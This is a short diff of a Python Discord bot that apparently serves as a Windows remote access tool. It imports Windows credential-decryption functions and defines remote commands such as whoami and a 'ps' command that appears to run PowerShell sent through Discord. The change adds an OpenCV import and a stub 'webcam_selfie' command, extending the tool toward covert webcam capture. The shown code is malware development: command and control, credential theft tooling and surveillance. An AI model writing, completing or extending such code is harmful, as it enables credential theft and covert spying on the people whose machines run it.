@@ -1,4 +1,5 @@
 import os
+import cv2
 import sys
 import uuid
 import json
@@ -24,7 +25,7 @@ from win32crypt import CryptUnprotectData
 # Constants
 TOKEN = "TOKEN" # Discord bot token
 USERNAME = os.getenv("USERNAME")  # Windows username
-GUILD_ID = 000000000000000000000  # Replace with your actual server ID (Interger)
+GUILD_ID = 0000000000000000000000000  # Replace with your actual server ID (Interger)
 
 # Vars for bot
 intents = discord.Intents.default()
@@ -173,6 +174,12 @@ async def whoami(ctx):
 @bot.command()
 async def send_message(ctx, *, message: str):
     await ctx.send(f"Sending message: {message}")
+
+@bot.command()
+async def webcam_selfie(ctx):
+    for i in range(0,10):
+        print(i)
+        
 
 @bot.command()
 async def ps(ctx, *, code: str):
